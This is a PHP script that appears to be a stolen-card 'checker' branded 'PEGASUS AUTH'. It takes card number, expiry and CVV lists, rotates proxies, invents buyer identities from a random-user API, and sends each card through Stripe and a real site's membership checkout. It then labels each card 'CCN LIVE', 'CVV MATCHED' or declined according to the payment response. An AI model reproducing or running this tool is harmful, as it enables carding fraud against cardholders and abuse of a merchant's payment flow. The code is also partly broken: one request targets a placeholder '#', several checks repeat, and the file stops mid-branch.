<?php 
//TO BE MADE\\
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 
if ($ano=="2021") {
$ano="2027";
}
if ($ano=="2022") {

$ano="2027";

}
# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods ');
//curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9 ',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=1f334bf2-7cbd-4756-8102-dcb7d1291050eac0f3&muid=03ec7354-8e76-4864-8511-ba2bb081df54749411&sid=c896f993-1d74-4082-b1bc-32a35f7d8c0573a48c&payment_user_agent=stripe.js%2Fa8b551343%3B+stripe-js-v3%2Fa8b551343&time_on_page=27526&key=pk_live_iHgoaxPsDDKugk2dRsK0S4wi');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://conversationsonretail.com/membership-account/membership-checkout/?level=2 ');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: conversationsonretail.com ',
'method: POST',
'path: /membership-account/membership-checkout/?level=2 ',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded ',
'cookie: PHPSESSID=f75bad17f1f18dab26543f47f298aa0c; pmpro_visit=1; tk_or=%22https%3A%2F%2Fwww.bing.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.bing.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.bing.com%2F%22; stripe_mid=03ec7354-8e76-4864-8511-ba2bb081df54749411; stripe_sid=c896f993-1d74-4082-b1bc-32a35f7d8c0573a48c',
'origin: https://conversationsonretail.com ',
'referer: https://conversationsonretail.com/membership-account/membership-checkout/?level=2 ',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=2&checkjavascript=1&other_discount_code=&username=shivang'.$firstname.'&password=iitbombaycse+&password2=iitbombaycse+&first_name=shivang&last_name=gupta&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX4478&ExpirationMonth=11&ExpirationYear=2025');

$result2 = curl_exec($ch);
$token = trim(strip_tags(getStr($result2,'"id": "','"')));


# -------------------- [3 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, '#');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ',
'method: POST',
'path: ',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json;charset=UTF-8',
'cookie: ',
'origin: ',
'referer: ',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
));

# ----------------- [3req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'#');

$result3 = curl_exec($ch);

# ---------------------------------------#

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

# ---------------- [Responses] ----------------- #

if
(strpos($result3,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Aprovadas CVV | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 ItzBay] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "Thank You For Donation.")) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Aprovadas CVV | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}
elseif
(strpos($result3,  '"Thank You For Donation."')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Aprovadas CVV | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV CHARGED MATCHED ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Aprovadas CVV | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Aprovadas CVV | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
} 
elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Aprovadas CVV | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "incorrect_zip")) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Aprovadas CVV | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result3,  '"type":"one-time"')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Aprovadas CVV | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "Error updating default payment method. Your card's security code is incorrect" )) {
  echo "$result2";
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN Real ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}
elseif

(strpos($result2,  'Error updating default payment method.')) {

  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>GENERIC DECLINE ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}
elseif
(strpos($result2,  'Your card was declined.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  "pickup_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "Your card's security code is incorrect.")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovadas | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'Your card has expired.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired ◣◥◤◢◣ ◥◤  [ 𝗣𝗘𝗚𝗔𝗦𝗨𝗦  𝗔𝗨𝗧𝗛  𝟭  𝗕𝗬 @𝗹𝗶𝘃𝗶𝗻𝗴𝗵𝘂𝗺𝗮𝗻𝗼𝗶𝗱 ] ◥◤◢◣◥◤◥ )] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result3,  'Your card number is incorrect.')) {
